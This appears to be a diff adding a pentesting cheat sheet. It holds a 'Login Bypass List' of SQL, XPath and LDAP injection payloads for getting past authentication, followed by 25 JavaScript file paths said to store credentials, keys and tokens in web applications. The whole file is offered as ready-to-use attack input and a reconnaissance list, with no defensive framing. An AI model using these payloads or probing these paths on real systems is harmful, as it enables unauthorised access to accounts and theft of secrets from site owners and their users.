@@ -1,0 +1,47 @@
+Login Bypass List:
+' or '1'='1
+' or ''
+' or 1)%00
+' or /* or '
+' or "a" or '
+' or 1 or '
+' or true() or '
+'or string-length(name(.))<10 or'
+'or contains(name,'adm') or'
+'or contains(.,'adm') or'
+'or position()=2 or'
+admin' or '
+admin' or '1'='2
+*
+*)(&
+*)|(&
+pwd)
+*)((*
+*))%00
+
+🔰Top 25 JavaScript path files used to store sensitive information in Web Application.
+01. /js/config.js
+02. /js/credentials.js
+03. /js/secrets.js
+04. /js/keys.js
+05. /js/password.js
+06. /js/api_keys.js
+07. /js/auth_tokens.js
+08. /js/access_tokens.js
+09. /js/sessions.js
+10. /js/authorization.js 
+11. /js/encryption.js
+12. /js/certificates.js
+13. /js/ssl_keys.js
+14. /js/passphrases.js 
+15. /js/policies.js
+16. /js/permissions.js 
+17. /js/privileges.js
+18. /js/hashes.js
+19. /js/salts.js
+20. /js/nonces.js
+21. /js/signatures.js
+22. /js/digests.js
+23. /js/tokens.js
+24. /js/cookies.js
+25. /js/topsecr3tdonotlook.js
